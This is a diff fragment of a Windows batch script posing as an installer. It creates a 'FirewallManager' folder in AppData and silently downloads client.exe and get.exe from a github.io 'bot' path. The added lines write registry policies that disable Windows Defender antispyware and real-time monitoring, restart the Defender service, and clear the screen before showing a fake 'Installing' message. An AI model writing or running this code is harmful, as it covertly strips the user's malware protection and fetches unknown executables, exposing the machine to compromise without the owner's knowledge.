@@ -3,6 +3,11 @@ cd C:\Users\%username%\AppData
 mkdir FirewallManager 
 cd FirewallManager
 color a
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+net stop WinDefend
+net start WinDefend
+cls 
 echo "Installing. Please wait"
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/client.exe
 curl -OJL --silent https://abrissyy.github.io/goodreps/bot/get.exe 
